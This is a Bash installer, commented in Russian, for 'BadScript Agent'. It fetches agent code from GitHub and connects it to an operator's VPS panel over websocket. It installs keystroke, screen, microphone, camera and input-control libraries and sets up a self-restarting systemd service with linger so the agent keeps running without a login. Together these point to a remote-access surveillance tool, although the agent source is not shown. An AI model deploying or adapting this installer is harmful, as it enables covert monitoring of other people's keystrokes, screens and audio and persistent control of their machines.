#!/bin/bash
# ============================================================
# BadScript Agent — Установщик для Linux
# Скачивает агент, ставит зависимости, запускает.
# ============================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo -e "${CYAN}"
    echo "  ╔══════════════════════════════════════╗"
    echo "  ║      BadScript Agent Installer       ║"
    echo "  ╚══════════════════════════════════════╝"
    echo -e "${NC}"
}

log_ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_err()  { echo -e "${RED}[✗]${NC} $1"; }
log_info() { echo -e "${CYAN}[→]${NC} $1"; }

INSTALL_DIR="$HOME/.badscript"
REPO_URL="https://github.com/Pryanik-M/BadScript/archive/refs/heads/main.zip"
VENV_DIR="$INSTALL_DIR/venv"

banner

# ============================================================
# 1. Ввод данных
# ============================================================
echo -e "${YELLOW}Введите данные для подключения агента:${NC}"
echo ""

read -p "  VPS адрес панели (например ws://1.2.3.4:8000/ws/agent/): " VPS_URL
if [ -z "$VPS_URL" ]; then
    log_err "Адрес VPS не может быть пустым!"
    exit 1
fi

read -p "  UID устройства (из панели): " DEVICE_UID
if [ -z "$DEVICE_UID" ]; then
    log_err "UID не может быть пустым!"
    exit 1
fi

read -sp "  Секретный токен (из панели): " DEVICE_SECRET
echo ""
if [ -z "$DEVICE_SECRET" ]; then
    log_err "Токен не может быть пустым!"
    exit 1
fi

echo ""
log_info "VPS:    $VPS_URL"
log_info "UID:    $DEVICE_UID"
log_info "Secret: ****${DEVICE_SECRET: -4}"
echo ""

# ============================================================
# 2. Проверка и установка зависимостей системы
# ============================================================
log_info "Проверка системных зависимостей..."

install_pkg() {
    if command -v apt-get &>/dev/null; then
        sudo apt-get update -qq && sudo apt-get install -y -qq "$@"
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y -q "$@"
    elif command -v yum &>/dev/null; then
        sudo yum install -y -q "$@"
    elif command -v pacman &>/dev/null; then
        sudo pacman -S --noconfirm "$@"
    else
        log_warn "Не удалось определить пакетный менеджер. Установите вручную: $*"
    fi
}

# Python 3
if ! command -v python3 &>/dev/null; then
    log_warn "Python3 не найден. Устанавливаю..."
    install_pkg python3 python3-pip python3-venv
else
    log_ok "Python3 найден: $(python3 --version)"
fi

# pip / venv
if ! python3 -m pip --version &>/dev/null 2>&1; then
    log_warn "pip не найден, устанавливаю..."
    install_pkg python3-pip
fi
if ! python3 -m venv --help &>/dev/null 2>&1; then
    log_warn "venv не найден, устанавливаю..."
    install_pkg python3-venv
fi

# curl или wget
if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
    log_warn "curl/wget не найден, устанавливаю curl..."
    install_pkg curl
fi

# unzip
if ! command -v unzip &>/dev/null; then
    log_warn "unzip не найден, устанавливаю..."
    install_pkg unzip
fi

log_ok "Системные зависимости в порядке"

# ============================================================
# 3. Скачивание агента с GitHub
# ============================================================
log_info "Скачивание агента с GitHub..."

mkdir -p "$INSTALL_DIR"
TMP_ZIP=$(mktemp /tmp/badscript_XXXXXX.zip)

if command -v curl &>/dev/null; then
    curl -sL "$REPO_URL" -o "$TMP_ZIP"
elif command -v wget &>/dev/null; then
    wget -q "$REPO_URL" -O "$TMP_ZIP"
fi

if [ ! -s "$TMP_ZIP" ]; then
    log_err "Не удалось скачать архив!"
    rm -f "$TMP_ZIP"
    exit 1
fi

log_ok "Архив скачан"

# ============================================================
# 4. Распаковка
# ============================================================
log_info "Распаковка..."

TMP_EXTRACT=$(mktemp -d /tmp/badscript_extract_XXXXXX)
unzip -qo "$TMP_ZIP" -d "$TMP_EXTRACT"
rm -f "$TMP_ZIP"

# Находим папку agent внутри архива
AGENT_SRC=""
for d in "$TMP_EXTRACT"/*/agent; do
    if [ -d "$d" ]; then
        AGENT_SRC="$d"
        break
    fi
done

if [ -z "$AGENT_SRC" ] || [ ! -f "$AGENT_SRC/agent.py" ]; then
    log_err "Не найден agent.py в архиве!"
    rm -rf "$TMP_EXTRACT"
    exit 1
fi

# Копируем файлы агента
cp -f "$AGENT_SRC/agent.py"   "$INSTALL_DIR/agent.py"
cp -f "$AGENT_SRC/shared.py"  "$INSTALL_DIR/shared.py"
cp -f "$AGENT_SRC/requirements.txt" "$INSTALL_DIR/requirements.txt" 2>/dev/null || true

rm -rf "$TMP_EXTRACT"
log_ok "Файлы агента скопированы в $INSTALL_DIR"

# ============================================================
# 5. Создание виртуального окружения и установка зависимостей
# ============================================================
log_info "Создание виртуального окружения..."

if [ ! -d "$VENV_DIR" ]; then
    python3 -m venv "$VENV_DIR"
fi
log_ok "Venv: $VENV_DIR"

log_info "Установка Python-зависимостей (это может занять пару минут)..."
"$VENV_DIR/bin/pip" install --upgrade pip -q
"$VENV_DIR/bin/pip" install -q \
    'websockets>=12' \
    'cryptography>=41' \
    'mss>=9' \
    'pillow>=10' \
    'psutil>=5.9' \
    'pynput>=1.7' \
    'numpy>=1.24'

# Опциональные — не ломаем установку если не ставятся
"$VENV_DIR/bin/pip" install -q 'opencv-python>=4.8' 2>/dev/null || log_warn "opencv-python не установлен (опционально)"
"$VENV_DIR/bin/pip" install -q 'keyboard>=0.13' 2>/dev/null || log_warn "keyboard не установлен (нужен root)"
"$VENV_DIR/bin/pip" install -q 'sounddevice>=0.4' 2>/dev/null || log_warn "sounddevice не установлен (опционально)"
"$VENV_DIR/bin/pip" install -q 'pyautogui>=0.9' 2>/dev/null || log_warn "pyautogui не установлен (опционально)"

log_ok "Зависимости установлены"

# ============================================================
# 6. Сохранение конфигурации
# ============================================================
CONFIG_FILE="$INSTALL_DIR/config.env"
cat > "$CONFIG_FILE" <<EOF
VPS_URL="$VPS_URL"
DEVICE_UID="$DEVICE_UID"
DEVICE_SECRET="$DEVICE_SECRET"
EOF
chmod 600 "$CONFIG_FILE"
log_ok "Конфиг сохранён: $CONFIG_FILE"

# ============================================================
# 7. Создание скрипта запуска
# ============================================================
LAUNCHER="$INSTALL_DIR/run.sh"
cat > "$LAUNCHER" <<'RUNEOF'
#!/bin/bash
DIR="$(cd "$(dirname "$0")" && pwd)"
source "$DIR/config.env"
exec "$DIR/venv/bin/python3" "$DIR/agent.py" \
    --vps "$VPS_URL" \
    --uid "$DEVICE_UID" \
    --secret "$DEVICE_SECRET" \
    --watchdog
RUNEOF
chmod +x "$LAUNCHER"
log_ok "Лаунчер: $LAUNCHER"

# ============================================================
# 8. Установка systemd-сервиса (автозапуск)
# ============================================================
echo ""
read -p "Установить автозапуск через systemd? [Y/n]: " INSTALL_SYSTEMD
INSTALL_SYSTEMD=${INSTALL_SYSTEMD:-Y}

if [[ "$INSTALL_SYSTEMD" =~ ^[Yy]$ ]]; then
    SYSTEMD_DIR="$HOME/.config/systemd/user"
    mkdir -p "$SYSTEMD_DIR"

    SERVICE_FILE="$SYSTEMD_DIR/badscript-agent.service"
    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=BadScript Agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/run.sh
WorkingDirectory=$INSTALL_DIR
Restart=always
RestartSec=10
Environment=DISPLAY=:0

[Install]
WantedBy=default.target
EOF

    systemctl --user daemon-reload
    systemctl --user enable badscript-agent.service
    systemctl --user start badscript-agent.service

    # Чтобы сервис работал без логина
    loginctl enable-linger "$(whoami)" 2>/dev/null || true

    log_ok "Systemd-сервис установлен и запущен"
    echo ""
    echo -e "  ${CYAN}Управление:${NC}"
    echo "    systemctl --user status badscript-agent"
    echo "    systemctl --user stop badscript-agent"
    echo "    systemctl --user restart badscript-agent"
    echo "    journalctl --user -u badscript-agent -f"
else
    log_info "Автозапуск пропущен"
fi

# ============================================================
# 9. Готово
# ============================================================
echo ""
echo -e "${GREEN}╔══════════════════════════════════════╗${NC}"
echo -e "${GREEN}║      Установка завершена! ✓          ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════╝${NC}"
echo ""
echo -e "  Папка:     ${CYAN}$INSTALL_DIR${NC}"
echo -e "  Запуск:    ${CYAN}$LAUNCHER${NC}"
echo -e "  Конфиг:    ${CYAN}$CONFIG_FILE${NC}"
echo ""

if [[ ! "$INSTALL_SYSTEMD" =~ ^[Yy]$ ]]; then
    echo -e "  ${YELLOW}Для ручного запуска:${NC}"
    echo "    bash $LAUNCHER"
    echo ""

    read -p "Запустить агент сейчас? [Y/n]: " RUN_NOW
    RUN_NOW=${RUN_NOW:-Y}
    if [[ "$RUN_NOW" =~ ^[Yy]$ ]]; then
        log_info "Запуск агента..."
        exec bash "$LAUNCHER"
    fi
fi
